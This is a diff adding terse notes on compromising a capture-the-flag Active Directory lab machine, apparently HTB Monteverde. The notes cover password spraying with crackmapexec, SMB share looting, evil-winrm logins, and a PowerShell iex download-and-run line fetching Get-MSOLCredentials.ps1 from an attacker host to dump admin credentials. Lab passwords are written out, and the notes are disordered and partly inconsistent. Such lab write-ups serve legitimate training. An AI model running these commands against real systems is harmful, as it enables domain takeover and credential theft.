@@ -1,0 +1,79 @@
+monteverde
+10.10.10.172
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+Found 2 subdomain
+monteverde.MEGABANK.LOCAL, hostmaster.MEGABANK.LOCAL.
+
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-10 05:36:42Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+--Found user names, They are given below
+Guest
+AAD_987d7f2f57d2
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+
+Found password for smb using crackmapexec
+
+crackmapexec smb 10.10.10.172 -u users -p users --continue-on-success
+
+MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+
+
+These are all typical Windows looking ports. Seeing TCP DNS (53) along with Kerberos (TCP 88) and LDAP (TCP 389) suggests this might be a domain controller.
+
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+
+445/tcp  open  microsoft-ds?
+Login with the user SABatchJobs:SABatchJobs
+smbclient -U SABatchJobs -L //10.10.10.172
+smbmap -u SABatchJobs -p SABatchJobs -P 445 -H 10.10.10.172
+Found some useful shares that can be read permission
+
+smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
+
+Found some xml file
+Downloaded the file to local machine
+smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs -c 'get mhope/azure.xml azure.xml'
+
+FIle contains password for the user 
+
+mhope:4n0therD4y@n0th3r
+
+Checking the creds using crackmapexec
+crackmapexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
+
+Login with evil-winrm
+
+evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
+
+got the shell and flagged the user hash
+
+Now need to get the privilages from mhope –> administrator
+
+net user mhope
+
+User is iin Global Group memberships    : *Azure Admins , *Domain Users
+python3 -m http.server 80
+iex(new-object net.webclient).downloadstring('http://10.10.14.11/Get-MSOLCredentials.ps1')
+
+Found administrator password
+
+administrator:d0m@in4dminyeah!
+
+evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
+
+
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
